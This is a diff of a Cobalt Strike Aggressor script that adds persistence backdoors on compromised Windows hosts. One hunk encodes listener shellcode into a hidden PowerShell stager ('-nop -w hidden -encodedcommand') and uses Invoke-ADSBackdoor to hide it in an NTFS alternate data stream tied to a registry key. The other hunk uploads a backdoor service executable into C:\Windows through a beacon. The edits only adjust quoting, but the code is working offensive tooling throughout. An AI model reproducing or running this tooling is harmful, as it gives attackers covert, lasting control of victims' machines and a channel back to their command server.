@@ -18,10 +18,10 @@ sub createADSBackdoor {
 	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\Temp\somefile.txt", {
 		# Encode shellcode for the stager
 		$psPayload = powershell_encode_stager(shellcode($selectedListener));
-		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload ";
+		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload";
 		binput($bid, "powershell-import Invoke-ADSBackdoor.ps1");
-		binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName $theADSRegName -backdoored_file_path $1 -cobaltstrike_gen_payload");
-		bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName $theADSRegName -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+		binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload");
+		bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
 	});
 }
 
@@ -41,7 +41,7 @@ popup beacon_bottom {
 			#	* build out a proper Java Swing menu to customize the options
 			foreach $bid ($1){
 				prompt_file_open("Select the service exe to use", $null, false, {
-					println("\c4Uploading backdoor on beacon $1 using file $2 ");
+					println("\c4Uploading backdoor on beacon $1 using file $2");
 					blog($1, "Attempting to publish backdoor service");
 					bcd($1, "C:\\Windows\\");
 					println("\c4Changed directory on beacon $1 to C:\\Windows\\");
